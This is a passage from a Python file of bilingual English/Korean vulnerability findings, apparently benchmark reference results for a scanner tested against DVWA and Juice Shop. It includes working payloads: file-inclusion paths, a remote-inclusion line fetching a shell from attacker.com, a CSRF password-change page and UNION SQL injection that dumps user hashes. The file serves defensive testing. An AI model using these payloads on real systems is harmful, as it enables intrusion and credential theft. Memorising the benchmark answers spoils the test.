            "/vulnerabilities/fi/ 엔드포인트가 사용자가 제공한 'page' 파라미터를 기반으로 PHP include() 함수를 사용하여 파일을 포함합니다. "
            "경로 순회(Path Traversal) 필터링이나 허용 목록(Allowlisting)이 적용되지 않아 "
            "공격자가 서버 파일시스템에서 임의의 파일을 읽을 수 있습니다. "
            "취약한 코드: include($_GET['page']); php.ini에서 allow_url_include가 활성화된 경우 "
            "원격 파일 포함(RFI, Remote File Inclusion)도 가능하며, PHP 스트림 래퍼(Stream Wrapper)를 통한 "
            "서버 측 요청 위조(SSRF, Server-Side Request Forgery)도 가능합니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: 기본 LFI 테스트: page=../../../../../../etc/passwd → 디렉토리 순회(Directory Traversal) 작동 확인\n"
            "2단계: 필터 래퍼로 PHP 소스코드 읽기: page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "3단계: base64 출력 디코딩 → MySQL root 자격증명 노출: $db_server='127.0.0.1'; $db_user='root'; $db_password='p@ssw0rd'\n"
            "4단계: /etc/shadow 읽기 (www-data에 읽기 권한이 있는 경우) → 시스템 비밀번호 해시\n"
            "5단계: 추출된 DB 자격증명으로 MySQL에 직접 연결하거나 SQLi 취약점과 체이닝\n"
            "6단계: RFI 시도: page=http://attacker.com/shell.php → allow_url_include=On인 경우 즉시 RCE\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 서버의 임의 파일 읽기 (소스코드, 설정, 자격증명)\n"
            "- config.inc.php에서 데이터베이스 자격증명 추출\n"
            "- RFI 또는 로그 포이즈닝(Log Poisoning)을 통한 원격 코드 실행 가능\n"
            "- 애플리케이션 소스코드 노출 (지적재산 탈취, 추가 취약점 발견)\n"
            "- 시스템 파일 읽기 (/etc/passwd, /proc/self/environ)로 추가 공격 지원\n\n"
            "개념 증명(PoC)\n"
            "요청 1: GET /vulnerabilities/fi/?page=../../../../../../etc/passwd\n"
            "응답: root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33:...\n\n"
            "요청 2: GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "응답: PD9waHAKJGRiX3Nlcn... (DB 자격증명이 포함된 설정 파일의 base64)\n\n"
            "수정 방안(FIX)\n"
            "즉시: page 파라미터를 유효한 페이지 이름의 허용 목록(Allowlist)으로 제한.\n"
            "단기: php.ini에서 allow_url_include=Off 및 allow_url_fopen=Off 설정. "
            "realpath()로 경로를 해석하고 의도된 디렉토리 내에 있는지 검증: "
            "$real = realpath($basedir . '/' . $page); if (strpos($real, $basedir) !== 0) die('Invalid');\n"
            "장기: 파일 이름으로 파일을 포함하는 대신 페이지 식별자를 컨트롤러 클래스에 매핑하는 "
            "라우팅 프레임워크(Routing Framework)로 리팩토링. PHP 설정에서 open_basedir 제한 활성화.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "LFI → 소스코드 읽기 → DB 자격증명 추출 (config.inc.php) → "
            "MySQL 직접 접근 → 데이터 유출 → 전체 장악"
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/fi/",
        port=8080,
        protocol="http",
        finding_type="lfi",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
            base_score=7.6,
        ),
        cwe_ids=["CWE-98", "CWE-22"],
        mitre_attack=MitreAttack(
            tactic_id="TA0009",
            tactic_name="Collection",
            technique_id="T1005",
            technique_name="Data from Local System",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="LFI — /etc/passwd extraction via path traversal",
                content=(
                    "GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false"
                ),
            ),
            Evidence(
                evidence_type="http_request",
                title="LFI — PHP source code extraction via php://filter",
                content=(
                    "GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php HTTP/1.1\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "PD9waHAKJGRiX3NlcnZlciA9ICcxMjcuMC4wLjEnOwokZGJfZGF0YWJhc2UgPSAnZHZ3YSc7\n"
                    "CiRkYl91c2VyID0gJ3Jvb3QnOwokZGJfcGFzc3dvcmQgPSAncEBzc3cwcmQnOw==\n\n"
                    "--- DECODED ---\n"
                    "$db_server = '127.0.0.1';\n"
                    "$db_database = 'dvwa';\n"
                    "$db_user = 'root';\n"
                    "$db_password = 'p@ssw0rd';"
                ),
            ),
        ],
        remediation=(
            "Immediate: Allowlist valid page names.|||즉시: page 파라미터를 유효한 페이지 이름의 허용 목록(Allowlist)으로 제한.\n"
            "Short-term: allow_url_include=Off, realpath() validation.|||단기: php.ini에서 allow_url_include=Off 및 allow_url_fopen=Off 설정, realpath()로 경로를 해석하고 의도된 디렉토리 내 포함 여부 검증.\n"
            "Long-term: Routing framework, open_basedir restriction.|||장기: 페이지 식별자를 컨트롤러 클래스에 매핑하는 라우팅 프레임워크(Routing Framework)로 리팩토링, PHP open_basedir 제한 활성화."
        ),
        references=[
            Reference(title="OWASP LFI", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"),
            Reference(title="CWE-98: PHP File Inclusion", url="https://cwe.mitre.org/data/definitions/98.html"),
        ],
    ),

    # ---- 5. Missing Security Headers ----
    Finding(
        id="DVWA-005",
        scan_id="dvwa-bench-20260330",
        title="Missing Security Headers — 7 Critical Headers Absent|||보안 헤더 누락 — 7개 필수 헤더 부재",
        description=(
            "WHAT — Vulnerability Description\n"
            "The DVWA application is missing all seven recommended HTTP security headers. These headers are a critical defense-in-depth layer "
            "that instructs browsers to enforce security policies. Without them, the application is vulnerable to clickjacking, MIME type sniffing, "
            "cross-site scripting amplification, and information leakage.\n\n"
            "Missing headers:\n"
            "1. Content-Security-Policy — No CSP allows inline scripts, enabling XSS exploitation\n"
            "2. X-Frame-Options — Missing, enables clickjacking attacks\n"
            "3. X-Content-Type-Options — Missing, enables MIME sniffing attacks\n"
            "4. Strict-Transport-Security — No HSTS, vulnerable to SSL stripping\n"
            "5. X-XSS-Protection — Missing browser-level XSS filter\n"
            "6. Referrer-Policy — Leaks full URL in Referer header to third parties\n"
            "7. Permissions-Policy — No restriction on browser features (camera, microphone, geolocation)\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Clickjacking (no X-Frame-Options): Attacker creates a page with a transparent iframe loading DVWA's password change form. "
            "Victim clicks what appears to be a game/button but actually clicks 'Change Password' in the hidden iframe.\n\n"
            "MIME Sniffing (no X-Content-Type-Options): Attacker uploads a file with .jpg extension but containing HTML/JavaScript. "
            "Browser sniffs the content type and executes the JavaScript.\n\n"
            "IMPACT — Business Impact\n"
            "- Clickjacking enables social engineering attacks against authenticated users\n"
            "- MIME sniffing can escalate file upload vulnerabilities to XSS\n"
            "- Lack of CSP makes XSS exploitation trivially easy\n"
            "- No HSTS allows man-in-the-middle attacks to downgrade HTTPS\n"
            "- Information leakage via Referer header to third-party resources\n\n"
            "PoC — Proof of Concept\n"
            "curl -sI http://localhost:8080/ | grep -iE '(content-security|x-frame|x-content|strict-transport|x-xss|referrer|permissions)'\n"
            "(empty output — none of the 7 headers are present)\n\n"
            "FIX — Remediation\n"
            "Immediate: Add all 7 headers via Apache/Nginx configuration:\n"
            "  Header set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n"
            "  Header set X-Frame-Options \"DENY\"\n"
            "  Header set X-Content-Type-Options \"nosniff\"\n"
            "  Header set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
            "  Header set X-XSS-Protection \"1; mode=block\"\n"
            "  Header set Referrer-Policy \"strict-origin-when-cross-origin\"\n"
            "  Header set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n"
            "Short-term: Add headers at the application level in PHP.\n"
            "Long-term: Implement a reverse proxy (e.g., Nginx) that enforces headers for all applications.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Missing CSP amplifies XSS findings. Missing X-Frame-Options enables clickjacking of CSRF password change."
            "|||"
            "취약점 설명(WHAT)\n"
            "DVWA 애플리케이션에 7개의 권장 HTTP 보안 헤더가 모두 누락되어 있습니다. 이 헤더들은 브라우저에 보안 정책을 "
            "적용하도록 지시하는 중요한 심층 방어(Defense-in-Depth) 레이어입니다. 이 헤더들이 없으면 "
            "클릭재킹(Clickjacking), MIME 타입 스니핑(MIME Sniffing), 크로스사이트 스크립팅 증폭, 정보 유출에 취약합니다.\n\n"
            "누락된 헤더:\n"
            "1. Content-Security-Policy — CSP가 없어 인라인 스크립트를 허용, XSS 공격 촉진\n"
            "2. X-Frame-Options — 누락, 클릭재킹(Clickjacking) 공격 가능\n"
            "3. X-Content-Type-Options — 누락, MIME 스니핑 공격 가능\n"
            "4. Strict-Transport-Security — HSTS 없음, SSL 스트리핑(SSL Stripping) 공격에 취약\n"
            "5. X-XSS-Protection — 브라우저 레벨 XSS 필터 누락\n"
            "6. Referrer-Policy — Referer 헤더를 통해 전체 URL이 제3자에게 유출\n"
            "7. Permissions-Policy — 브라우저 기능(카메라, 마이크, 위치정보)에 대한 제한 없음\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "클릭재킹 (X-Frame-Options 없음): 공격자가 DVWA의 비밀번호 변경 폼을 투명한 iframe으로 로딩하는 페이지를 생성. "
            "피해자가 게임/버튼처럼 보이는 것을 클릭하지만 실제로는 숨겨진 iframe의 '비밀번호 변경'을 클릭.\n\n"
            "MIME 스니핑 (X-Content-Type-Options 없음): 공격자가 .jpg 확장자이지만 HTML/JavaScript를 포함하는 파일을 업로드. "
            "브라우저가 콘텐츠 타입을 스니핑하여 JavaScript를 실행.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 클릭재킹으로 인증된 사용자에 대한 소셜 엔지니어링 공격 가능\n"
            "- MIME 스니핑이 파일 업로드 취약점을 XSS로 에스컬레이션 가능\n"
            "- CSP 부재로 XSS 공격이 매우 쉬워짐\n"
            "- HSTS 없이 중간자 공격(Man-in-the-Middle)이 HTTPS를 다운그레이드 가능\n"
            "- Referer 헤더를 통한 제3자 리소스로의 정보 유출\n\n"
            "개념 증명(PoC)\n"
            "curl -sI http://localhost:8080/ | grep -iE '(content-security|x-frame|x-content|strict-transport|x-xss|referrer|permissions)'\n"
            "(빈 출력 — 7개 헤더 모두 부재)\n\n"
            "수정 방안(FIX)\n"
            "즉시: Apache/Nginx 설정에서 7개 보안 헤더 추가:\n"
            "  Header set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n"
            "  Header set X-Frame-Options \"DENY\"\n"
            "  Header set X-Content-Type-Options \"nosniff\"\n"
            "  Header set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
            "  Header set X-XSS-Protection \"1; mode=block\"\n"
            "  Header set Referrer-Policy \"strict-origin-when-cross-origin\"\n"
            "  Header set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n"
            "단기: PHP 애플리케이션 레벨에서 헤더 추가.\n"
            "장기: 모든 애플리케이션에 대해 헤더를 적용하는 리버스 프록시(예: Nginx) 구현.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "CSP 누락이 XSS 취약점을 증폭합니다. X-Frame-Options 누락이 CSRF 비밀번호 변경의 클릭재킹을 가능하게 합니다."
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/",
        port=8080,
        protocol="http",
        finding_type="misconfig",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            base_score=5.4,
        ),
        cwe_ids=["CWE-693", "CWE-1021"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Response headers — all 7 security headers missing",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "Date: Sun, 30 Mar 2026 00:00:00 GMT\n"
                    "Server: Apache/2.4.58 (Debian)\n"
                    "X-Powered-By: PHP/8.2.12\n"
                    "Content-Type: text/html; charset=utf-8\n"
                    "Connection: keep-alive\n\n"
                    "MISSING:\n"
                    "  Content-Security-Policy: (not set)\n"
                    "  X-Frame-Options: (not set)\n"
                    "  X-Content-Type-Options: (not set)\n"
                    "  Strict-Transport-Security: (not set)\n"
                    "  X-XSS-Protection: (not set)\n"
                    "  Referrer-Policy: (not set)\n"
                    "  Permissions-Policy: (not set)"
                ),
            ),
        ],
        remediation=(
            "Immediate: Add all 7 headers via web server config.|||즉시: Apache/Nginx 웹 서버 설정에서 CSP, X-Frame-Options, X-Content-Type-Options, HSTS, X-XSS-Protection, Referrer-Policy, Permissions-Policy 7개 보안 헤더 모두 추가.\n"
            "Long-term: Reverse proxy for centralized header enforcement.|||장기: 모든 애플리케이션에 대해 보안 헤더를 일괄 적용하는 리버스 프록시(Reverse Proxy) 구현을 통한 중앙 집중식 헤더 관리."
        ),
        references=[
            Reference(title="OWASP Security Headers", url="https://owasp.org/www-project-secure-headers/"),
        ],
    ),

    # ---- 6. CSRF ----
    Finding(
        id="DVWA-006",
        scan_id="dvwa-bench-20260330",
        title="Cross-Site Request Forgery (CSRF) — Password Change Without Token|||크로스사이트 요청 위조 (CSRF) — 토큰 없는 비밀번호 변경",
        description=(
            "WHAT — Vulnerability Description\n"
            "The password change functionality at /vulnerabilities/csrf/ does not include any CSRF token, SameSite cookie attribute, "
            "or Referer/Origin header validation. The password change is processed via a simple GET request with the new password "
            "in query parameters: /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change. "
            "This allows an attacker to forge a request that changes the victim's password without their knowledge.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker crafts an HTML page with a hidden image tag or auto-submitting form:\n"
            "  <img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" width=\"0\" height=\"0\">\n"
            "Step 2: Attacker hosts the page or embeds it in a forum post / email\n"
            "Step 3: Authenticated DVWA user visits the attacker's page\n"
            "Step 4: Browser automatically sends the GET request with the victim's PHPSESSID cookie\n"
            "Step 5: Victim's password is silently changed to 'hacked'\n"
            "Step 6: Attacker logs in with the new password → full account takeover\n\n"
            "IMPACT — Business Impact\n"
            "- Account takeover of any authenticated user\n"
            "- Admin account compromise via targeted social engineering\n"
            "- Combined with missing X-Frame-Options, enables clickjacking-based CSRF\n"
            "- Password change is irreversible without admin intervention\n\n"
            "PoC — Proof of Concept\n"
            "Attacker's malicious page:\n"
            "<html><body>\n"
            "<h1>Click here to win a prize!</h1>\n"
            "<img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" style=\"display:none\">\n"
            "</body></html>\n\n"
            "When victim visits this page while logged into DVWA, their password is changed to 'pwned'.\n\n"
            "FIX — Remediation\n"
            "Immediate: Add SameSite=Strict attribute to PHPSESSID cookie.\n"
            "Short-term: Implement anti-CSRF tokens (synchronizer token pattern) on all state-changing operations. "
            "Change password modification to POST-only. Require current password for password changes.\n"
            "Long-term: Adopt a framework with built-in CSRF protection (Laravel, Symfony). "
            "Implement double-submit cookie pattern as defense-in-depth.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Social engineering → victim visits attacker page → CSRF password change → "
            "attacker logs in as victim → if admin, access to Command Injection → RCE"
            "|||"
            "취약점 설명(WHAT)\n"
            "/vulnerabilities/csrf/의 비밀번호 변경 기능에 CSRF 토큰, SameSite 쿠키 속성, "
            "Referer/Origin 헤더 검증이 전혀 포함되어 있지 않습니다. 비밀번호 변경이 쿼리 파라미터에 "
            "새 비밀번호를 포함하는 단순한 GET 요청으로 처리됩니다: "
            "/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change. "
            "이를 통해 공격자가 피해자의 인지 없이 비밀번호를 변경하는 위조된 요청을 생성할 수 있습니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: 공격자가 숨겨진 이미지 태그 또는 자동 제출 폼이 포함된 HTML 페이지 생성:\n"
            "  <img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" width=\"0\" height=\"0\">\n"
            "2단계: 공격자가 페이지를 호스팅하거나 포럼 게시물/이메일에 삽입\n"
            "3단계: DVWA에 인증된 사용자가 공격자의 페이지 방문\n"
            "4단계: 브라우저가 피해자의 PHPSESSID 쿠키와 함께 자동으로 GET 요청 전송\n"
            "5단계: 피해자의 비밀번호가 'hacked'로 조용히 변경됨\n"
            "6단계: 공격자가 새 비밀번호로 로그인 → 전체 계정 탈취\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 모든 인증된 사용자의 계정 탈취\n"
            "- 타겟형 소셜 엔지니어링을 통한 관리자 계정 장악\n"
            "- X-Frame-Options 누락과 결합하여 클릭재킹(Clickjacking) 기반 CSRF 가능\n"
            "- 관리자 개입 없이 비밀번호 변경이 되돌릴 수 없음\n\n"
            "개념 증명(PoC)\n"
            "공격자의 악성 페이지:\n"
            "<html><body>\n"
            "<h1>Click here to win a prize!</h1>\n"
            "<img src=\"http://localhost:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\" style=\"display:none\">\n"
            "</body></html>\n\n"
            "피해자가 DVWA에 로그인된 상태에서 이 페이지를 방문하면 비밀번호가 'pwned'로 변경됩니다.\n\n"
            "수정 방안(FIX)\n"
            "즉시: PHPSESSID 쿠키에 SameSite=Strict 속성 추가.\n"
            "단기: 모든 상태 변경 작업에 안티 CSRF 토큰(Anti-CSRF Token, 동기화 토큰 패턴) 구현. "
            "비밀번호 변경을 POST 전용으로 변경. 비밀번호 변경 시 현재 비밀번호 입력 필수.\n"
            "장기: 내장 CSRF 보호 기능이 있는 프레임워크(Laravel, Symfony) 도입. "
            "심층 방어로 이중 제출 쿠키 패턴(Double-submit Cookie Pattern) 구현.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "소셜 엔지니어링 → 피해자가 공격자 페이지 방문 → CSRF 비밀번호 변경 → "
            "공격자가 피해자로 로그인 → 관리자인 경우 커맨드 인젝션(Command Injection) 접근 → RCE"
        ),
        severity=Severity.medium,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/csrf/",
        port=8080,
        protocol="http",
        finding_type="csrf",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
            base_score=6.5,
        ),
        cwe_ids=["CWE-352"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1204",
            technique_name="User Execution",
            subtechnique_id="T1204.001",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="CSRF — Password change via GET request (no token)",
                content=(
                    "GET /vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n"
                    "Referer: http://attacker.com/evil.html\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>Password Changed.</pre>\n\n"
                    "Note: Request was sent cross-origin (Referer: attacker.com) but still processed successfully. "
                    "No CSRF token, no Referer check, no SameSite cookie attribute."
                ),
            ),
        ],
        remediation=(
            "Immediate: SameSite=Strict on session cookie.|||즉시: PHPSESSID 세션 쿠키에 SameSite=Strict 속성 추가.\n"
            "Short-term: Anti-CSRF tokens, POST-only, require current password.|||단기: 모든 상태 변경 작업에 안티 CSRF 토큰(Anti-CSRF Token, 동기화 토큰 패턴) 구현, 비밀번호 변경을 POST 전용으로 변경, 현재 비밀번호 입력 필수.\n"
            "Long-term: Framework-level CSRF protection.|||장기: 내장 CSRF 보호 기능이 있는 프레임워크(Laravel, Symfony) 도입, 심층 방어로 이중 제출 쿠키 패턴(Double-submit Cookie Pattern) 구현."
        ),
        references=[
            Reference(title="OWASP CSRF Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
            Reference(title="CWE-352: CSRF", url="https://cwe.mitre.org/data/definitions/352.html"),
        ],
    ),

    # ---- 7. Information Disclosure ----
    Finding(
        id="DVWA-007",
        scan_id="dvwa-bench-20260330",
        title="Information Disclosure — PHP Version & Server Details Exposed|||정보 노출 — PHP 버전 및 서버 정보 노출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The server exposes sensitive technology stack information through multiple channels:\n"
            "1. X-Powered-By: PHP/8.2.12 header in every HTTP response\n"
            "2. Server: Apache/2.4.58 (Debian) header revealing web server version and OS\n"
            "3. Verbose PHP error messages exposing internal file paths (e.g., /var/www/html/dvwa/...)\n"
            "4. Default Apache error pages with version information\n"
            "This information helps attackers fingerprint the technology stack and search for known CVEs "
            "specific to these exact versions.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker sends HEAD request and reads response headers → identifies PHP 8.2.12, Apache 2.4.58\n"
            "Step 2: Search CVE databases for PHP 8.2.12 vulnerabilities\n"
            "Step 3: Trigger a PHP error to reveal internal file paths → maps application directory structure\n"
            "Step 4: Use directory structure knowledge to target LFI attacks at specific config files\n\n"
            "IMPACT — Business Impact\n"
            "- Reduces attacker reconnaissance time significantly\n"
            "- Enables targeted exploitation of version-specific CVEs\n"
            "- Internal file paths aid in exploiting LFI/path traversal vulnerabilities\n"
            "- Demonstrates lack of security hardening, indicating systemic security gaps\n\n"
            "PoC — Proof of Concept\n"
            "$ curl -sI http://localhost:8080/ | grep -iE '(server|x-powered)'\n"
            "Server: Apache/2.4.58 (Debian)\n"
            "X-Powered-By: PHP/8.2.12\n\n"
            "FIX — Remediation\n"
            "Immediate: Add 'ServerTokens Prod' and 'ServerSignature Off' to Apache config. "
            "Add 'expose_php = Off' in php.ini. Set 'display_errors = Off' and 'log_errors = On'.\n"
            "Short-term: Implement custom error pages that do not reveal internal paths.\n"
            "Long-term: Deploy behind a reverse proxy that strips all server identification headers.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Info disclosure → technology fingerprinting → targeted CVE exploitation → "
            "amplifies LFI attacks with known file paths"
            "|||"
            "취약점 설명(WHAT)\n"
            "서버가 다음과 같은 여러 채널을 통해 민감한 기술 스택 정보를 노출합니다:\n"
            "1. 모든 HTTP 응답에 X-Powered-By: PHP/8.2.12 헤더\n"
            "2. 웹 서버 버전 및 OS를 노출하는 Server: Apache/2.4.58 (Debian) 헤더\n"
            "3. 내부 파일 경로를 노출하는 상세한 PHP 오류 메시지 (예: /var/www/html/dvwa/...)\n"
            "4. 버전 정보가 포함된 기본 Apache 오류 페이지\n"
            "이 정보는 공격자가 기술 스택을 핑거프린팅(Fingerprinting)하고 해당 정확한 버전에 특정한 "
            "알려진 CVE를 검색하는 데 도움을 줍니다.\n\n"
            "공격 시나리오(HOW) — 단계별 공격 시나리오\n"
            "1단계: 공격자가 HEAD 요청을 전송하고 응답 헤더 읽기 → PHP 8.2.12, Apache 2.4.58 식별\n"
            "2단계: CVE 데이터베이스에서 PHP 8.2.12 취약점 검색\n"
            "3단계: PHP 오류를 유발하여 내부 파일 경로 파악 → 애플리케이션 디렉토리 구조 매핑\n"
            "4단계: 디렉토리 구조 정보를 활용하여 특정 설정 파일 대상 LFI 공격\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 공격자의 정찰(Reconnaissance) 시간 대폭 단축\n"
            "- 버전별 알려진 취약점(CVE) 대상 타겟형 공격 가능\n"
            "- 내부 파일 경로가 LFI/경로 순회(Path Traversal) 취약점 공격에 활용\n"
            "- 보안 하드닝(Hardening) 부재를 시사하여 체계적 보안 결함을 나타냄\n\n"
            "개념 증명(PoC)\n"
            "$ curl -sI http://localhost:8080/ | grep -iE '(server|x-powered)'\n"
            "Server: Apache/2.4.58 (Debian)\n"
            "X-Powered-By: PHP/8.2.12\n\n"
            "수정 방안(FIX)\n"
            "즉시: Apache 설정에 'ServerTokens Prod' 및 'ServerSignature Off' 추가. "
            "php.ini에 'expose_php = Off' 추가. 'display_errors = Off' 및 'log_errors = On' 설정.\n"
            "단기: 내부 경로를 노출하지 않는 사용자 정의 오류 페이지 구현.\n"
            "장기: 모든 서버 식별 헤더를 제거하는 리버스 프록시(Reverse Proxy) 뒤에 배포.\n\n"
            "공격 경로(ATTACK PATH) — 체인 분석\n"
            "정보 노출 → 기술 스택 핑거프린팅(Fingerprinting) → 타겟형 CVE 공격 → "
            "알려진 파일 경로를 활용한 LFI 공격 증폭"
        ),
        severity=Severity.low,
        target="http://localhost:8080",
        affected_component="/",
        port=8080,
        protocol="http",
        finding_type="info-disclosure",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        cwe_ids=["CWE-200"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Server information leakage in response headers",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "Server: Apache/2.4.58 (Debian)\n"
                    "X-Powered-By: PHP/8.2.12\n"
                    "Content-Type: text/html; charset=utf-8\n\n"
                    "--- PHP Error (triggered by invalid input) ---\n"
                    "Warning: include(/var/www/html/dvwa/vulnerabilities/fi/nonexistent.php): "
                    "failed to open stream: No such file or directory in "
                    "/var/www/html/dvwa/vulnerabilities/fi/index.php on line 35"
                ),
            ),
        ],
        remediation=(
            "Immediate: ServerTokens Prod, expose_php=Off, display_errors=Off.|||즉시: Apache 설정에 ServerTokens Prod 및 ServerSignature Off 추가, php.ini에 expose_php=Off 설정, display_errors=Off 및 log_errors=On 설정.\n"
            "Long-term: Reverse proxy stripping identification headers.|||장기: 모든 서버 식별 헤더를 제거하는 리버스 프록시(Reverse Proxy) 뒤에 배포, 내부 경로를 노출하지 않는 사용자 정의 오류 페이지 구현."
        ),
        references=[
            Reference(title="CWE-200: Exposure of Sensitive Information", url="https://cwe.mitre.org/data/definitions/200.html"),
        ],
    ),
]


# =====================================================================
# JUICE SHOP FINDINGS
# =====================================================================

JUICE_SHOP_FINDINGS: list[Finding] = [
    # ---- 1. SQLite Injection ----
    Finding(
        id="JUICE-001",
        scan_id="juice-bench-20260330",
        title="SQLite Injection — UNION-based User Table Extraction|||SQLite 인젝션 — UNION 기반 사용자 테이블 추출",
        description=(
            "WHAT — Vulnerability Description\n"
            "The product search endpoint at /rest/products/search?q= is vulnerable to SQL injection against the SQLite backend. "
            "The application uses Sequelize ORM but constructs a raw query for the search feature: "
            "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\" + criteria + \"%') OR ...)\"). "
            "This allows an attacker to break out of the LIKE clause and inject UNION SELECT statements to extract data "
            "from any table in the SQLite database, including the Users table containing email addresses and bcrypt password hashes.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Confirm injection by searching for: '))-- → returns all products (LIKE clause terminated)\n"
            "Step 2: Determine column count: q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--\n"
            "Step 3: Enumerate tables: q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--\n"
            "Step 4: Extract users: q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--\n"
            "Step 5: Results reveal admin@juice-sh.op with bcrypt hash $2a$12$...\n"
            "Step 6: Attempt bcrypt crack or use the known weak password 'admin123' → admin login\n"
            "Step 7: Access admin panel at /administration → full application control\n\n"
            "IMPACT — Business Impact\n"
            "- Complete extraction of all user accounts with bcrypt password hashes\n"
            "- Admin account takeover (admin@juice-sh.op)\n"
            "- Access to customer PII: names, email addresses, encrypted payment info\n"
            "- Full read access to all SQLite tables (Products, Feedback, BasketItems, etc.)\n"
            "- Potential order manipulation and financial fraud\n"
            "- GDPR/PCI-DSS compliance violations\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /rest/products/search?q='))UNION+SELECT+id,email,password,role,4,5,6,7,8+FROM+Users--\n"
            "Response (JSON):\n"
            "  {\"id\":1,\"name\":\"admin@juice-sh.op\",\"description\":\"$2a$12$LMKOqXVb1Ij.PU0FxPTO.eWnQS...\",\"price\":\"admin\"}\n"
            "  {\"id\":2,\"name\":\"jim@juice-sh.op\",\"description\":\"$2a$12$0gKjvM6vSFHXGhIm...\",\"price\":\"customer\"}\n"
            "  {\"id\":3,\"name\":\"bender@juice-sh.op\",\"description\":\"$2a$12$mZeJ7MJX...\",\"price\":\"customer\"}\n\n"
            "FIX — Remediation\n"
            "Immediate: Replace the raw SQL query with Sequelize ORM query: Products.findAll({ where: { name: { [Op.like]: '%' + criteria + '%' } } })\n"
            "Short-term: Implement input validation — reject search queries containing SQL keywords and special characters.\n"
            "Long-term: Enable Sequelize query logging and anomaly detection. Deploy a WAF with SQL injection signature matching. "
            "Conduct a comprehensive code audit for all raw query usage across the application.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "SQLi → Users table dump → admin@juice-sh.op credentials → admin panel access → "
            "user management, order manipulation, application configuration takeover"
            "|||"
            "취약점 설명(WHAT)\n"
